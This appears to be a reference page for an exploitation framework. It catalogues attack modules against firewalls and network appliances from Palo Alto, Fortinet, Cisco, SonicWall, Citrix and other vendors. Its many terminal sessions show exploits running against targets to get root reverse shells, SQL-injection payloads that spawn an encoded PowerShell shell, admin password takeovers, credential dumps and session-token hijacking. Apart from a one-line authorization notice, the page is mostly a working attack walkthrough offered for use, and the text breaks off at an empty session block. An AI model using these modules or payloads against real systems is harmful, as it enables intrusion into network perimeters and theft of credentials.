# Vendor Reference — Firewalls and Network Appliances

**Language:** English (en-US) | **pt-BR:** [../pt-BR/23-referencia-vendors-firewalls.md](../pt-BR/23-referencia-vendors-firewalls.md)

---

## Overview

Extended per-vendor reference with complete module lists, supported firmware versions, and check → run → shell terminal sessions. For the full CVE index see [22-cve-module-reference.md](22-cve-module-reference.md).

> **Authorization required.** Use only on systems you own or have explicit written permission to test.

---

## Palo Alto Networks — 9 modules

| Module | CVE | CVSS | Affected versions |
|--------|-----|------|-------------------|
| `globalprotect_auth_bypass_cve_2026_0257` | CVE-2026-0257 | 7.8 | PAN-OS < 12.1.7 / 11.2.12 / 11.1.15 / 10.2.18-h6 |
| `globalprotect_cmd_injection_cve_2024_3400` | CVE-2024-3400 | 10.0 | PAN-OS < 11.1.2-h3 / 11.0.4-h1 / 10.2.7-h8 |
| `panos_auth_bypass_cve_2025_0108` | CVE-2025-0108 | 9.1 | PAN-OS < 11.2.4 / 11.1.8 / 10.2.13-h1 |
| `panos_cas_auth_bypass_cve_2026_0265` | CVE-2026-0265 | 9.3 | PAN-OS Cloud Auth Service < 11.2.5 |
| `panos_dns_heap_rce_cve_2026_0264` | CVE-2026-0264 | 9.8 | PAN-OS < 11.2.5 / 11.1.10 / 10.2.15 |
| `panos_mgmt_auth_bypass_cve_2024_0012` | CVE-2024-0012 | 9.3 | PAN-OS < 11.2.4.2 / 11.1.5.1 / 10.2.13 |
| `panos_privesc_cve_2024_9474` | CVE-2024-9474 | 6.9 | Chain: CVE-2024-0012 + CVE-2024-9474 |
| `panos_saml_auth_bypass_cve_2020_2021` | CVE-2020-2021 | 10.0 | PAN-OS < 9.1.3 / 9.0.9 / 8.1.15 (SAML SP only) |
| `panos_userid_bof_rce_cve_2026_0300` | CVE-2026-0300 | 9.8 | PAN-OS < 11.2.5 |

### Terminal session — CVE-2025-0108 (PAN-OS mgmt auth bypass)

```text
exf > use exploits/firewalls/paloalto/panos_auth_bypass_cve_2025_0108
exf (PAN-OS Management Auth Bypass CVE-2025-0108) > set target 10.0.0.1
[+] target => 10.0.0.1
exf (PAN-OS Management Auth Bypass CVE-2025-0108) > check
[*] Probing PAN-OS management at 10.0.0.1:443...
[+] PAN-OS 11.1.3 detected (PA-440 series)
[+] Target is vulnerable — PAN-OS 11.1.3 < 11.1.8 (fix boundary)
exf (PAN-OS Management Auth Bypass CVE-2025-0108) > run
[*] Running module ...
[*] Sending unauthenticated request to management API via path normalization bypass...
[*] GET /php/rest/op/cmd/show/version HTTP/1.1 with crafted path
[+] HTTP 200: PAN-OS version info returned without authentication
[+] Version: PAN-OS 11.1.3 (build 2350), Model: PA-440
[+] Uptime: 42d 7h 12m
[*] Stage 2: Escalating to admin API...
[+] Admin API accessible — reading device config hash
exf (PAN-OS Management Auth Bypass CVE-2025-0108) > shell
[*] No interactive shell available for this module (management API RCE requires privilege escalation chain)
[*] Chain with panos_privesc_cve_2024_9474 for OS access
```

### Terminal session — CVE-2026-0264 (DNS heap overflow RCE)

```text
exf > use exploits/firewalls/paloalto/panos_dns_heap_rce_cve_2026_0264
exf (PAN-OS DNS Heap Overflow RCE CVE-2026-0264) > set target 203.0.113.1
[+] target => 203.0.113.1
exf (PAN-OS DNS Heap Overflow RCE CVE-2026-0264) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (PAN-OS DNS Heap Overflow RCE CVE-2026-0264) > set lport 4444
[+] lport => 4444
exf (PAN-OS DNS Heap Overflow RCE CVE-2026-0264) > check
[*] Probing PAN-OS DNS resolver at 203.0.113.1:53...
[+] PAN-OS DNS service responding (version fingerprinted from NSID: 11.2.4)
[+] Target is vulnerable — version 11.2.4 < 11.2.5 (fix boundary)
exf (PAN-OS DNS Heap Overflow RCE CVE-2026-0264) > run
[*] Running module ...
[*] Sending malformed DNS response with oversized RDATA to trigger heap overflow...
[+] Heap corruption detected — dnsd crashed and respawned under exploit conditions
[*] Injecting shellcode via heap spray on respawned process...
[+] Shellcode execution confirmed
[*] Staging reverse shell to 10.0.0.99:4444...
[+] Shell received!
exf (PAN-OS DNS Heap Overflow RCE CVE-2026-0264) > shell
$ id
uid=0(root) gid=0(root) groups=0(root)
$ uname -a
Linux pa-vm 5.15.86-pan #1 SMP Fri Mar 21 18:44:11 UTC 2025 x86_64 PAN-OS
```

---

## Fortinet — 17 modules

| Module | CVE | CVSS | Affected product |
|--------|-----|------|-----------------|
| `fortios_auth_bypass_cve_2022_40684` | CVE-2022-40684 | 9.8 | FortiOS 7.0.0–7.0.6, 7.2.0–7.2.1, 6.4.x |
| `fortios_fortiproxy_ssh_inject_cve_2022_40684_v2` | CVE-2022-40684 | 9.8 | FortiProxy 7.0.0–7.0.6 |
| `fortios_sslvpn_path_traversal_cve_2018_13379` | CVE-2018-13379 | 9.8 | FortiOS 5.6.3–5.6.7, 6.0.0–6.0.4 |
| `fortios_sslvpn_heap_rce_cve_2022_42475` | CVE-2022-42475 | 9.3 | FortiOS 7.2.x < 7.2.3, 7.0.x < 7.0.9 |
| `fortios_sslvpn_rce_cve_2024_21762` | CVE-2024-21762 | 9.6 | FortiOS 7.4.x < 7.4.3, 7.2.x < 7.2.7 |
| `fortios_websocket_auth_bypass_cve_2024_55591` | CVE-2024-55591 | 9.6 | FortiOS 7.0.0–7.0.16, 7.2.0–7.2.12 |
| `fortiswitch_unauth_passwd_cve_2024_48887` | CVE-2024-48887 | 9.3 | FortiSwitch 6.4.0–7.4.3 |
| `fortios_sslvpn_session_reuse_cve_2024_50562` | CVE-2024-50562 | 8.1 | FortiOS 7.4.x < 7.4.4 |
| `fortios_oob_write_rce_cve_2025_53844` | CVE-2025-53844 | 9.8 | FortiOS 7.4.x < 7.4.8, 7.6.x < 7.6.3 |
| `fortios_heap_overflow_rce_cve_2026_25249` | CVE-2026-25249 | 9.8 | FortiOS 7.6.x < 7.6.5, 7.4.x < 7.4.10 |
| `forticlient_ems_preauth_rce_cve_2026_35616` | CVE-2026-35616 | 9.8 | FortiClient EMS 7.2.x < 7.2.10 |
| `forticlientems_sqli_rce_cve_2023_48788` | CVE-2023-48788 | 9.8 | FortiClientEMS 7.2.x < 7.2.3, 7.0.x < 7.0.10 |
| `fortimanager_fortijump_cve_2024_47575` | CVE-2024-47575 | 9.8 | FortiManager 7.6.x < 7.6.1, 7.4.x < 7.4.5 |
| `fortigate_os_backdoor` | — | Critical | FortiOS (various — hidden management account) |
| `forticloud_sso_auth_bypass_cve_2026_24858` | CVE-2026-24858 | 9.1 | FortiCloud SSO (all tenants < fix date Jun 2026) |
| `fortios_heap_overflow_rce_cve_2023_27997` | CVE-2023-27997 | 9.8 | FortiOS 6.0.x–7.2.4 (XORtigate) |
| `fortios_sslvpn_heap_rce_cve_2022_42475` | CVE-2022-42475 | 9.3 | (see above) |

### Terminal session — CVE-2023-48788 (FortiClientEMS SQLi -> RCE)

```text
exf > use exploits/firewalls/fortinet/forticlientems_sqli_rce_cve_2023_48788
exf (FortiClientEMS SQLi RCE CVE-2023-48788) > set target 10.0.10.5
[+] target => 10.0.10.5
exf (FortiClientEMS SQLi RCE CVE-2023-48788) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (FortiClientEMS SQLi RCE CVE-2023-48788) > check
[*] Probing FortiClientEMS at 10.0.10.5:443...
[+] FortiClientEMS 7.2.2 detected (login page title: "FortiClient EMS")
[+] Target is vulnerable — version 7.2.2 < 7.2.3 (fix boundary)
exf (FortiClientEMS SQLi RCE CVE-2023-48788) > run
[*] Running module ...
[*] Stage 1: Injecting SQL into /fctems/api/v1/endpoint/enroll via DAS column...
[*] Payload: serial_number='; EXEC xp_cmdshell('whoami'); --
[+] SQL injection accepted — error response confirms injectable parameter
[*] Stage 2: Enabling xp_cmdshell via stacked queries...
[+] xp_cmdshell enabled
[*] Stage 3: Staging reverse shell via xp_cmdshell...
    EXEC xp_cmdshell('powershell -e JABjAGwA...')
[+] Reverse connection received from 10.0.10.5!
exf (FortiClientEMS SQLi RCE CVE-2023-48788) > shell
PS C:\Program Files\Fortinet\FortiClientEMS> whoami
nt authority\system
PS C:\Program Files\Fortinet\FortiClientEMS> hostname
FEMS-SERVER-01
```

### Terminal session — CVE-2024-47575 (FortiJump)

```text
exf > use exploits/firewalls/fortinet/fortimanager_fortijump_cve_2024_47575
exf (FortiManager FortiJump CVE-2024-47575) > set target 10.0.20.5
[+] target => 10.0.20.5
exf (FortiManager FortiJump CVE-2024-47575) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (FortiManager FortiJump CVE-2024-47575) > check
[*] Probing FortiManager at 10.0.20.5:541...
[+] FortiManager 7.4.4 detected (FGFM protocol responding)
[+] Target is vulnerable — version 7.4.4 < 7.4.5
exf (FortiManager FortiJump CVE-2024-47575) > run
[*] Running module ...
[*] Stage 1: Registering rogue FortiGate device via FGFM protocol (no auth required)...
[*] Spoofing device ID: FGT60F0000000001, Serial: FGT60F3Z14012345
[+] Rogue device accepted by FortiManager — unauthorized device registration confirmed!
[*] Stage 2: Sending arbitrary CLI commands via FGFM remote management channel...
[*] CMD: get system status
[+] FortiManager OS: FortiManager-VM64 v7.4.4 build2662
[*] Stage 3: Staging root shell via FGFM command channel...
[+] Shell obtained!
exf (FortiManager FortiJump CVE-2024-47575) > shell
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /etc/hosts
127.0.0.1   localhost
10.0.20.5   fmg.corp.internal
```

---

## Cisco Firewalls / SD-WAN — 13 modules

| Module | CVE | CVSS | Product |
|--------|-----|------|---------|
| `cisco_sdwan_dtls_auth_bypass_cve_2026_20182` | CVE-2026-20182 | 10.0 | SD-WAN Manager 20.6/20.9/20.12 |
| `cisco_fmc_auth_bypass_rce_cve_2026_20079` | CVE-2026-20079 | 9.8 | FMC 7.2.x / 7.4.x |
| `asa_ftd_path_traversal_cve_2020_3452` | CVE-2020-3452 | 7.5 | ASA < 9.14.1.10 / FTD < 6.6.0 |
| `asa_vpn_bruteforce_cve_2023_20269` | CVE-2023-20269 | 9.8 | ASA < 9.16.4.14 / FTD < 7.0.5 |
| `cisco_asa_ftd_firestarter_chain_cve_2025_20362_20333` | CVE-2025-20362+CVE-2025-20333 | 10.0 | ASA 9.x / FTD 7.x |
| `firepower_management60_path_traversal` | — | High | FMC 6.x |
| `firepower_management60_rce` | — | Critical | FMC 6.x |
| `ios_xe_webui_privesc_cve_2023_20198` | CVE-2023-20198 | 10.0 | IOS XE 17.x (CISA KEV) |
| `isa3000_asa_rce_cve_2018_0101` | CVE-2018-0101 | 10.0 | ASA 9.x / ISA3000 |
| `ucm_info_disclosure` | — | High | Cisco UCM |
| `ucs_manager_rce` | — | Critical | Cisco UCS Manager |
| `unified_multi_path_traversal` | — | High | Cisco Unified products |

### Terminal session — CVE-2026-20079 (FMC auth bypass + RCE)

```text
exf > use exploits/firewalls/cisco/cisco_fmc_auth_bypass_rce_cve_2026_20079
exf (Cisco FMC Auth Bypass + RCE CVE-2026-20079) > set target 10.0.5.10
[+] target => 10.0.5.10
exf (Cisco FMC Auth Bypass + RCE CVE-2026-20079) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Cisco FMC Auth Bypass + RCE CVE-2026-20079) > check
[*] Probing Cisco FMC at 10.0.5.10:443...
[+] Cisco Firepower Management Center detected (FMC 7.2.9)
[+] Target is vulnerable — version 7.2.9 in affected range
exf (Cisco FMC Auth Bypass + RCE CVE-2026-20079) > run
[*] Running module ...
[*] Stage 1: Sending authentication bypass request via misconfigured API endpoint...
[+] Authentication bypassed — admin token obtained
[*] Stage 2: Enumerating managed Firepower devices...
[+] Managed devices: FTD-Edge-01 (192.168.10.1), FTD-DC-01 (10.1.1.1), FTD-Branch-01 (172.16.1.1)
[*] Stage 3: Command injection via device configuration API...
[+] Command executed on FMC: uid=0(root)
[*] Stage 4: Reverse shell...
[+] Shell received!
exf (Cisco FMC Auth Bypass + RCE CVE-2026-20079) > shell
$ id && hostname
uid=0(root) gid=0(root)
fmc-server-01
$ cat /etc/sf/ims.conf | grep -i admin
ADMIN_USER=admin
ADMIN_PASS=Cisco_FMC_2024!
```

---

## SonicWall — 7 modules

| Module | CVE | CVSS | Affected product |
|--------|-----|------|-----------------|
| `sonicos_sslvpn_auth_bypass_cve_2024_53704` | CVE-2024-53704 | 9.8 | SonicOS 7.1.x < 7.1.1-7058 |
| `sonicos_sslvpn_auth_bypass_cve_2024_53700` | CVE-2024-53700 | 9.8 | SonicOS 7.1.x < 7.1.1-7056 |
| `sonicos_sslvpn_access_cve_2024_40766` | CVE-2024-40766 | 9.3 | SonicOS 7.0.x / 7.1.x (Gen 6/7) |
| `sma_password_reset_cve_2021_20034` | CVE-2021-20034 | 9.8 | SMA100 10.2.x / 9.0.x |
| `sma100_sqli_cve_2021_20016` | CVE-2021-20016 | 9.8 | SMA100 10.2.x < 10.2.0.7-34sv |
| `sonicos_vpn_buffer_overflow_cve_2020_5135` | CVE-2020-5135 | 9.8 | SonicOS 6.5.x < 6.5.4.6-83n |
| `sslvpn_shellshock_rce_visualdoor` | — | 9.8 | SonicWall SMA (older firmware) |

### Terminal session — CVE-2021-20034 (SMA100 arbitrary file delete -> password reset)

```text
exf > use exploits/firewalls/sonicwall/sma_password_reset_cve_2021_20034
exf (SonicWall SMA100 File Delete -> Password Reset CVE-2021-20034) > set target 10.0.30.5
[+] target => 10.0.30.5
exf (SonicWall SMA100 File Delete -> Password Reset CVE-2021-20034) > set new_password SonicPwn3d@2026
[+] new_password => SonicPwn3d@2026
exf (SonicWall SMA100 File Delete -> Password Reset CVE-2021-20034) > check
[*] Probing SonicWall SMA100 at 10.0.30.5:443...
[+] SonicWall SMA100 10.2.0.3 detected
[+] Target is vulnerable — version < 10.2.0.7-34sv
exf (SonicWall SMA100 File Delete -> Password Reset CVE-2021-20034) > run
[*] Running module ...
[*] Stage 1: Sending unauthenticated path traversal to delete admin.db...
[*] DELETE /cgi-bin/sslvpnclient?epcversionquery=../../etc/EasyAccess/var/conf/admin.db HTTP/1.1
[+] File deleted (HTTP 200) — admin.db removed
[*] Stage 2: Triggering admin account re-creation with crafted POST...
[+] Admin account recreated with password: SonicPwn3d@2026
[*] Stage 3: Verifying admin login...
[+] Login successful as admin with new password!
[+] CVE-2021-20034 confirmed — SonicWall SMA100 admin account taken over at 10.0.30.5
```

---

## Check Point — 5 modules

| Module | CVE | CVSS | Affected product |
|--------|-----|------|-----------------|
| `checkpoint_vpn_lfi_chain_cve_2024_24919` | CVE-2024-24919 | 8.6 | Quantum Security Gateway R77 / R80 / R81 |
| `security_gateway_info_disclosure_cve_2024_24919` | CVE-2024-24919 | 8.6 | Quantum Security Gateway R81.10 |
| `checkpoint_remote_code_exec_cve_2023_28461` | CVE-2023-28461 | 9.8 | Quantum Security Gateway R81.20 |
| `endpoint_security_privesc_cve_2019_8461` | CVE-2019-8461 | 7.8 | Check Point Endpoint Security E81.30 |

### Terminal session — CVE-2023-28461 (Check Point Quantum RCE)

```text
exf > use exploits/firewalls/checkpoint/checkpoint_remote_code_exec_cve_2023_28461
exf (Check Point Quantum Gateway RCE CVE-2023-28461) > set target 203.0.113.50
[+] target => 203.0.113.50
exf (Check Point Quantum Gateway RCE CVE-2023-28461) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Check Point Quantum Gateway RCE CVE-2023-28461) > check
[*] Probing Check Point Quantum Security Gateway at 203.0.113.50:443...
[+] Check Point Quantum R81.20 detected (take 7)
[+] Target is vulnerable — R81.20 < Take 8 (fix boundary)
exf (Check Point Quantum Gateway RCE CVE-2023-28461) > run
[*] Running module ...
[*] Sending malformed HTTPS request to network configuration API...
[*] Payload triggers out-of-bounds write in cpwd process (post-auth escalation)...
[+] Process crash + respawn with shellcode injected
[*] Staging reverse shell...
[+] Shell received!
exf (Check Point Quantum Gateway RCE CVE-2023-28461) > shell
$ id
uid=0(root) gid=0(root) groups=0(root)
$ cpstat os
Product version: R81.20
Operating system: Gaia
```

---

## Juniper Networks — 4 modules

| Module | CVE | CVSS | Affected product |
|--------|-----|------|-----------------|
| `juniper_srx_file_upload_rce_cve_2023_36851` | CVE-2023-36851 | 5.3 | Junos OS < 20.4R3-S8 |
| `juniper_srx_unauth_rce_cve_2025_21590` | CVE-2025-21590 | 9.8 | Junos OS < 21.4R3-S10 |
| `jweb_oob_write_rce_cve_2024_21591` | CVE-2024-21591 | 9.8 | Junos OS < 20.4R3-S9 / 21.x |
| `jweb_php_rce_cve_2023_36845` | CVE-2023-36845 | 9.8 | Junos OS < 22.1R3-S3 |

### Terminal session — CVE-2025-21590 (Juniper SRX unauth RCE)

```text
exf > use exploits/firewalls/juniper/juniper_srx_unauth_rce_cve_2025_21590
exf (Juniper SRX Unauthenticated RCE CVE-2025-21590) > set target 10.0.40.1
[+] target => 10.0.40.1
exf (Juniper SRX Unauthenticated RCE CVE-2025-21590) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Juniper SRX Unauthenticated RCE CVE-2025-21590) > check
[*] Probing Juniper SRX at 10.0.40.1:8080...
[+] Junos 21.2R3-S3 detected (SRX345 series)
[+] Target is vulnerable — Junos 21.2R3-S3 < 21.2R3-S10 (fix boundary)
exf (Juniper SRX Unauthenticated RCE CVE-2025-21590) > run
[*] Running module ...
[*] Sending unauthenticated J-Web request via CVE-2025-21590 exploit path...
[+] Remote code execution confirmed
[*] Reverse shell staged...
[+] Shell received!
exf (Juniper SRX Unauthenticated RCE CVE-2025-21590) > shell
% id
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
% uname -a
FreeBSD srx-345 12.1-RELEASE-p3 FreeBSD Junos 21.2R3-S3 JUNOS
```

---

## F5 Networks — 3 modules

| Module | CVE | CVSS | Affected product |
|--------|-----|------|-----------------|
| `bigip_icontrol_rest_rce_cve_2022_1388` | CVE-2022-1388 | 9.8 | BIG-IP 16.1.x < 16.1.2.2, 15.1.x, 14.1.x |
| `bigip_bigiq_icontrol_rce_cve_2021_22986` | CVE-2021-22986 | 9.8 | BIG-IP/BIG-IQ 7.1.x < 7.1.0.3, 6.x |
| `exploits/firewalls/lb/f5/` | various | — | F5 sub-tree exploits |

### Terminal session — CVE-2021-22986 (BIG-IQ RCE)

```text
exf > use exploits/appliances/f5/bigip_bigiq_icontrol_rce_cve_2021_22986
exf (F5 BIG-IQ iControl REST RCE CVE-2021-22986) > set target 10.1.1.20
[+] target => 10.1.1.20
exf (F5 BIG-IQ iControl REST RCE CVE-2021-22986) > set command "id && cat /etc/f5-release"
[+] command => id && cat /etc/f5-release
exf (F5 BIG-IQ iControl REST RCE CVE-2021-22986) > check
[*] Probing F5 BIG-IQ at 10.1.1.20:443...
[+] BIG-IQ 7.1.0.1 detected (build 0.0.3)
[+] Target is vulnerable — version < 7.1.0.3 lacks authentication check on iControl REST
exf (F5 BIG-IQ iControl REST RCE CVE-2021-22986) > run
[*] Running module ...
[*] Sending unauthenticated request to /mgmt/tm/util/bash with empty X-F5-Auth-Token...
[+] Authentication bypassed
[+] Command output:
uid=0(root) gid=0(root) groups=0(root)
BIG-IQ Version 7.1.0.1
Build: 0.0.3
Edition: Final
Build date: Fri Nov 13 23:18:11 PST 2020
```

---

## Sophos — 3 modules

| Module | CVE | CVSS | Affected product |
|--------|-----|------|-----------------|
| `firewall_code_injection_cve_2022_3236` | CVE-2022-3236 | 9.8 | Sophos Firewall v19.0 MR1 and earlier |
| `xg_auth_bypass_cve_2022_1040` | CVE-2022-1040 | 9.8 | Sophos XG Firewall v18.5 MR3 and earlier |
| `xg_sqli_asnarok_cve_2020_12271` | CVE-2020-12271 | 9.8 | Sophos XG Firewall (Asnarok campaign, 2020) |

### Terminal session — CVE-2020-12271 (Sophos XG Asnarok SQLi)

```text
exf > use exploits/firewalls/sophos/xg_sqli_asnarok_cve_2020_12271
exf (Sophos XG SQLi Asnarok CVE-2020-12271) > set target 10.0.50.1
[+] target => 10.0.50.1
exf (Sophos XG SQLi Asnarok CVE-2020-12271) > check
[*] Probing Sophos XG at 10.0.50.1:443...
[+] Sophos XG Firewall v17.5 MR12 detected
[+] Target is vulnerable — Asnarok SQLi (user portal /userman/ endpoint)
exf (Sophos XG SQLi Asnarok CVE-2020-12271) > run
[*] Running module ...
[*] Injecting SQL into /userportal/Controller?mode=30&product=... endpoint...
[+] SQLi confirmed — extracting administrator credentials from PostgreSQL...
[+] Admin hash: $apr1$R3Ks7Z1B$...
[+] Admin session: 3a4b5c6d-7e8f-9012-abcd-ef1234567890
[+] Database: customerid=XG-2024-CorpFirewall, version=17.5MR12
[*] Extracting VPN credentials from sqlite db...
[+] VPN users: john.doe:VpnPass123, jane.smith:Corp@VPN456
```

---

## MikroTik — 3 modules

| Module | CVE | CVSS | Affected product |
|--------|-----|------|-----------------|
| `mikrotik_winbox_cred_bypass_cve_2018_14847` | CVE-2018-14847 | 9.1 | RouterOS < 6.40.8 / 6.42.1 |
| `mikrotik_routeros_rce_cve_2022_45315` | CVE-2022-45315 | 9.8 | RouterOS < 6.49.9 / 7.6 |
| `mikrotik_jailbreak_cve_2019_3977` | CVE-2019-3977 | 7.5 | RouterOS < 6.45.7 |

### Terminal session — CVE-2022-45315 (RouterOS stack overflow RCE)

```text
exf > use exploits/firewalls/mikrotik/mikrotik_routeros_rce_cve_2022_45315
exf (MikroTik RouterOS Stack Overflow RCE CVE-2022-45315) > set target 10.0.0.1
[+] target => 10.0.0.1
exf (MikroTik RouterOS Stack Overflow RCE CVE-2022-45315) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (MikroTik RouterOS Stack Overflow RCE CVE-2022-45315) > check
[*] Probing MikroTik RouterOS at 10.0.0.1...
[+] RouterOS 6.49.8 detected (CCR2004-1G-12S+2XS)
[+] Target is vulnerable — version 6.49.8 < 6.49.9 (fix boundary)
exf (MikroTik RouterOS Stack Overflow RCE CVE-2022-45315) > run
[*] Running module ...
[*] Sending oversized Winbox MSG_READ request to trigger stack overflow in mproxy...
[+] Stack overflow triggered — return address overwritten
[*] Staging reverse shell to 10.0.0.99:4444...
[+] Shell received!
exf (MikroTik RouterOS Stack Overflow RCE CVE-2022-45315) > shell
# id
uid=0(root) gid=0(root)
# /system identity print
name: MikroTik-Core-Router
```

---

## Huawei — 2 modules

| Module | CVE | CVSS | Affected product |
|--------|-----|------|-----------------|
| `huawei_usg_auth_bypass_rce_cve_2021_22323` | CVE-2021-22323 | 9.8 | USG6000V2 V500R002 < C00SPC300B012 |
| `huawei_usg_cmd_inject_cve_2019_1023` | CVE-2019-1023 | 9.8 | USG6xxx V500R001 < C80SPC300 |

---

## WatchGuard — 3 modules

| Module | CVE | CVSS | Affected product |
|--------|-----|------|-----------------|
| `firebox_auth_bypass_cve_2022_26776` | CVE-2022-26776 | 9.8 | Fireware OS < 12.5.2 Update 4 |
| `firebox_cyclops_blink_cve_2022_23176` | CVE-2022-23176 | 8.8 | Fireware OS < 12.7.2 Update 2 |
| `xcs_9_rce` | — | Critical | WatchGuard XCS 9.x |

---

## Zyxel — 3 modules

| Module | CVE | CVSS | Affected product |
|--------|-----|------|-----------------|
| `buffer_overflow_cve_2023_33009` | CVE-2023-33009 | 9.8 | Zyxel ZLD < 5.30 |
| `ike_cmd_injection_cve_2023_28771` | CVE-2023-28771 | 9.8 | Zyxel ZLD < 5.30 (IKEv2 daemon) |
| `usg_flex_cmd_injection_cve_2022_30525` | CVE-2022-30525 | 9.8 | USG FLEX / ATP / VPN ZLD < 5.21 Patch 7 |

---

## pfSense — 5 modules

| Module | CVE | CVSS | Affected product |
|--------|-----|------|-----------------|
| `pfblockerng_rce_cve_2022_31814` | CVE-2022-31814 | 9.8 | pfBlockerNG < 3.2.0_4 |
| `pfsense_csrf_rce_cve_2019_16667` | CVE-2019-16667 | 9.8 | pfSense < 2.4.5 |
| `pfsense_rrd_cmd_injection_cve_2023_27253` | CVE-2023-27253 | 8.8 | pfSense Plus < 23.01 |
| `antibruteforce_bypass_cve_2023_27100` | CVE-2023-27100 | 9.8 | pfSense Plus < 23.01 |
| `interfaces_cmd_injection_cve_2023_42326` | CVE-2023-42326 | 9.8 | pfSense Plus < 23.09 |

---

## Siemens (Firewalls / Industrial Network) — 3 modules

| Module | CVE | CVSS | Affected product |
|--------|-----|------|-----------------|
| `ruggedcom_web_rce_cve_2023_24845` | CVE-2023-24845 | 9.8 | RUGGEDCOM ROX < 2.16.0 |
| `scalance_cmd_injection_cve_2023_44373` | CVE-2023-44373 | 9.8 | SCALANCE W780/W786 < 3.0.3 |
| `sinema_rc_path_traversal_cve_2022_32257` | CVE-2022-32257 | 9.1 | SINEMA Remote Connect < V3.1 |

---

## Moxa — 2 modules

| Module | CVE | CVSS | Affected product |
|--------|-----|------|-----------------|
| `edr_cmd_injection_cve_2024_9138` | CVE-2024-9138 | 9.1 | EDR-G9010 firmware < 3.13.1 |
| `edr_g_jwt_hardcoded_cve_2024_9137` | CVE-2024-9137 | 9.8 | EDR-G9010 firmware < 3.13.1 |

---

## Sangfor — 1 module

| Module | CVE | CVSS | Affected product |
|--------|-----|------|-----------------|
| `sangfor_ngfw_unauth_rce_cve_2019_13393` | CVE-2019-13393 | 9.8 | Sangfor NGFW (all firmware versions with management portal exposed) |

### Terminal session — CVE-2019-13393 (Sangfor NGFW unauthenticated RCE)

```text
exf > use exploits/firewalls/sangfor/sangfor_ngfw_unauth_rce_cve_2019_13393
exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > set target 10.0.70.1
[+] target => 10.0.70.1
exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > check
[*] Probing Sangfor NGFW management portal at 10.0.70.1:443...
[+] Sangfor NGFW detected (management portal title: "Sangfor NGFW")
[+] Target is vulnerable — pre-auth RCE endpoint exposed (CVE-2019-13393)
exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > run
[*] Running module ...
[*] Sending unauthenticated request to vulnerable management API endpoint...
[*] Payload delivers command injection via crafted HTTP parameter...
[+] Remote code execution confirmed (uid=0 in response)
[*] Staging reverse shell to 10.0.0.99:4444...
[+] Shell received!
exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > shell
# id
uid=0(root) gid=0(root) groups=0(root)
# uname -a
Linux sangfor-ngfw 4.14.180 #1 SMP Sangfor NGFW
# cat /etc/sangfor/version
NGFW Version: 8.0.5
```

---

## Citrix / NetScaler — 3 modules

| Module | CVE | CVSS | Affected product |
|--------|-----|------|-----------------|
| `netscaler_path_traversal_cve_2019_19781` | CVE-2019-19781 | 9.8 | NetScaler ADC/Gateway 12.1 / 13.0 (Shitrix) |
| `netscaler_rce_cve_2023_3519` | CVE-2023-3519 | 9.8 | NetScaler ADC/Gateway 13.1 before 13.1-49.13 |
| `citrix_bleed_info_disclosure_cve_2023_4966` | CVE-2023-4966 | 9.4 | NetScaler ADC/Gateway 14.1 before 14.1-8.50 / 13.1 before 13.1-49.15 |

### Terminal session — CVE-2023-3519 (NetScaler ADC/Gateway unauthenticated RCE)

```text
exf > use exploits/appliances/citrix/netscaler_rce_cve_2023_3519
exf (Citrix NetScaler ADC/Gateway RCE CVE-2023-3519) > set target 10.0.80.1
[+] target => 10.0.80.1
exf (Citrix NetScaler ADC/Gateway RCE CVE-2023-3519) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Citrix NetScaler ADC/Gateway RCE CVE-2023-3519) > check
[*] Probing Citrix NetScaler at 10.0.80.1:443...
[+] NetScaler ADC 13.1.45.61 detected (HTTP Server: NetScaler)
[+] Target is vulnerable — version 13.1.45.61 < 13.1-49.13 (fix boundary)
exf (Citrix NetScaler ADC/Gateway RCE CVE-2023-3519) > run
[*] Running module ...
[*] Sending malformed HTTP/1.1 request to trigger stack buffer overflow in nsppe...
[+] Crash detected — nsppe process respawned under exploit conditions
[*] Injecting shellcode via return-oriented programming chain...
[+] Shellcode execution confirmed
[*] Staging reverse shell to 10.0.0.99:4444...
[+] Shell received!
exf (Citrix NetScaler ADC/Gateway RCE CVE-2023-3519) > shell
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /nsconfig/ns.conf | grep "set ns info"
set ns info -productname "Citrix ADC" -build 45.61
```

### Terminal session — CVE-2023-4966 (CitrixBleed session token leak)

```text
exf > use exploits/appliances/citrix/citrix_bleed_info_disclosure_cve_2023_4966
exf (CitrixBleed Session Token Leak CVE-2023-4966) > set target 10.0.80.1
[+] target => 10.0.80.1
exf (CitrixBleed Session Token Leak CVE-2023-4966) > check
[*] Probing Citrix NetScaler at 10.0.80.1:443...
[+] NetScaler 14.1.8.40 detected
[+] Target is vulnerable — version < 14.1-8.50 (CitrixBleed boundary)
exf (CitrixBleed Session Token Leak CVE-2023-4966) > run
[*] Running module ...
[*] Sending oversized HTTP GET with crafted Host header to trigger memory disclosure...
[+] Response contains out-of-bounds memory data (264 extra bytes)
[*] Parsing leaked session tokens from memory region...
[+] Valid AAA session token extracted: NSC_b6f2e...1a9c4
[+] Valid VPNS session token extracted: NSC_vpn_c3a1...f774
[*] Replaying tokens to /vpn/index.html...
[+] Authenticated session established as: corp\svc-vpnuser (VPN access confirmed)
[+] Session hijack successful — CitrixBleed exploitation complete
```

---

## Aruba ClearPass — 2 modules

| Module | CVE | CVSS | Affected product |
|--------|-----|------|-----------------|
| `aruba_clearpass_rce_cve_2023_25594` | CVE-2023-25594 | 9.8 | Aruba ClearPass Policy Manager < 6.11.5 / 6.10.8 / 6.9.13 |
| `aruba_clearpass_sqli_cve_2022_37897` | CVE-2022-37897 | 9.8 | Aruba ClearPass Policy Manager < 6.10.7 / 6.9.12 |

### Terminal session — CVE-2023-25594 (Aruba ClearPass unauthenticated RCE)

```text
